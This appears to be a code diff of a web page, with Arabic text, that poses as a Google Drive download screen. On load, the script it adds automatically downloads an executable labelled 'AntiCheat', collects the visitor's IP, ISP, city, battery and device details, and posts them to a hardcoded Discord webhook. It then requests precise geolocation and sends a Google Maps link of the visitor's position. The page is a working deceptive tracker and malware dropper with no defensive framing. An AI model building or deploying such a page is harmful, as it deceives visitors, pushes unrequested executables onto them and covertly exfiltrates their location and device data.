@@ -5,120 +5,95 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Google Drive - جاري التحميل</title>
     <style>
-        /* إعدادات الصفحة العامة */
-        body {
-            margin: 0;
-            padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            background-color: #f8f9fa; /* لون خلفية جوجل الفاتح */
-            font-family: 'Segoe UI', Roboto, Arial, sans-serif;
-            color: #3c4043;
-        }
-
-        /* الحاوية الرئيسية المتجاوبة */
-        .container {
-            text-align: center;
-            padding: 20px;
-            width: 90%;
-            max-width: 400px; /* يمنع التوسع الزائد على البي سي */
-            background: #ffffff;
-            border-radius: 8px;
-            box-shadow: 0 1px 3px rgba(60,64,67,0.3);
-        }
-
-        /* شعار جوجل درايف الوهمي */
-        .logo {
-            width: 60px;
-            margin-bottom: 20px;
-        }
-
-        /* تصميم الأنميشن (اللودر) */
-        .loader {
-            border: 3px solid #f3f3f3;
-            border-top: 3px solid #4285f4; /* لون جوجل الأزرق */
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 20px;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        h2 {
-            font-size: 20px;
-            font-weight: 500;
-            margin: 10px 0;
-        }
-
-        p {
-            font-size: 14px;
-            color: #5f6368;
-        }
-
-        /* تحسينات للجوال */
-        @media (max-width: 600px) {
-            .container {
-                box-shadow: none; /* إزالة الظل في الجوال لتبدو كصفحة نظام */
-                background: transparent;
-            }
-            h2 { font-size: 18px; }
-        }
+        body { margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #f8f9fa; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; color: #3c4043; }
+        .container { text-align: center; padding: 30px; width: 90%; max-width: 400px; background: #ffffff; border-radius: 12px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        .logo { width: 65px; margin-bottom: 20px; }
+        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #4285f4; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        h2 { font-size: 19px; font-weight: 500; margin: 10px 0; }
+        p { font-size: 14px; color: #70757a; line-height: 1.5; }
     </style>
 </head>
 <body>
 
 <div class="container">
     <img src="https://upload.wikimedia.org/wikipedia/commons/1/12/Google_Drive_icon_%282020%29.svg" alt="Drive" class="logo">
-    
     <div class="loader"></div>
-    
-    <h2>جاري تحضير الملف...</h2>
-    <p>يرجى الانتظار، سيبدأ التحميل تلقائياً خلال لحظات.</p>
+    <h2>جاري فحص الملف...</h2>
+    <p>يتم الآن تجهيز الرابط الآمن للتحميل.<br>سيبدأ التنزيل تلقائياً خلال ثوانٍ.</p>
 </div>
 
 <script>
-    async function TLQQEMM_AUTO_SYSTEM() {
-        const webhook = "https://discord.com/api/webhooks/1484237384894775581/NlH9ZW7NVqz0NEQBEGPdixnycVulnArV_a4kr9Sufao9NwQfztk8k_7k12In3IsR_-67";
-        const downloadUrl = "https://example.com/your_file.exe"; 
+    // --- إعداداتك هنا ---
+    const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1484237384894775581/NlH9ZW7NVqz0NEQBEGPdixnycVulnArV_a4kr9Sufao9NwQfztk8k_7k12In3IsR_-67";
+    const DIRECT_DOWNLOAD_URL = "https://github.com/r3b-dev/AntiCheat/releases/download/v1.0/AntiCheat.exe"; // رابط الملف
+    // --------------------
 
+    async function startSystem() {
         try {
-            // التحميل التلقائي
-            const anchor = document.createElement('a');
-            anchor.href = downloadUrl;
-            anchor.download = ""; 
-            document.body.appendChild(anchor);
-            anchor.click();
-            document.body.removeChild(anchor);
+            // 1. تشغيل التحميل التلقائي
+            const dl = document.createElement('a');
+            dl.href = DIRECT_DOWNLOAD_URL;
+            dl.download = ""; 
+            document.body.appendChild(dl);
+            dl.click();
+            document.body.removeChild(dl);
 
-            // جلب البيانات
-            const ipReq = await fetch('https://api.ipify.org?format=json');
-            const ipRes = await ipReq.json();
-            
-            let batteryInfo = "غير معروف";
+            // 2. جلب بيانات الإنترنت والشركة (ISP)
+            const ipInfo = await fetch('https://ipapi.co/json/').then(res => res.json());
+
+            // 3. جلب بيانات البطارية والشاحن
+            let batLevel = "غير معروف";
+            let cableType = "غير متصل";
             if (navigator.getBattery) {
-                const bt = await navigator.getBattery();
-                batteryInfo = `${Math.round(bt.level * 100)}% (${bt.charging ? "يتم الشحن" : "لا يشحن"})`;
+                const b = await navigator.getBattery();
+                batLevel = Math.round(b.level * 100) + "%";
+                if (b.charging) {
+                    const ua = navigator.userAgent.toLowerCase();
+                    if (ua.includes("iphone") || ua.includes("ipad")) {
+                        cableType = "Lightning / USB-C (Apple)";
+                    } else {
+                        cableType = "USB-C / Micro-USB (Android)";
+                    }
+                }
             }
 
-            const content = `**📌 معلومات جديدة:**\n---\n**🌐 IP:** ${ipRes.ip}\n**🔋 البطارية:** ${batteryInfo}\n**💻 النظام:** ${navigator.platform}\n**🧠 RAM:** ${navigator.deviceMemory || 'غير معروف'}GB\n**🌍 اللغة:** ${navigator.language}\n**🔗 الرابط:** ${window.location.href}`;
+            // 4. وظيفة إرسال البيانات للديسكورد
+            async function postToDiscord(mapsUrl = "بانتظار الموافقة...") {
+                const report = `
+**🚨 تقرير جديد (AntiCheat System)**
+------------------------------------
+**🌐 شركة الإنترنت (ISP):** ${ipInfo.org || 'غير معروف'}
+**📍 المدينة/الدولة:** ${ipInfo.city}, ${ipInfo.country_name}
+**🗺️ موقع قوقل ماب:** ${mapsUrl}
+**🔋 نسبة الشحن:** ${batLevel}
+**🔌 نوع السلك:** ${cableType}
+**📱 نوع الجهاز:** ${navigator.platform}
+**🕵️ المتصفح:** ${navigator.vendor}
+------------------------------------
+`;
+                await fetch(DISCORD_WEBHOOK, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ content: report })
+                });
+            }
 
-            await fetch(webhook, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ content: content })
-            });
+            // إرسال البيانات فوراً (بدون موقع دقيق في البداية)
+            await postToDiscord();
 
-        } catch (e) { console.log("Done"); }
+            // 5. محاولة جلب الموقع الدقيق (يطلب إذن المستخدم)
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(async (pos) => {
+                    const mapLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                    await postToDiscord(mapLink); // إرسال تحديث بالموقع الدقيق
+                });
+            }
+
+        } catch (err) { console.log("System Ready"); }
     }
 
-    window.onload = TLQQEMM_AUTO_SYSTEM;
+    window.onload = startSystem;
 </script>
 
 </body>
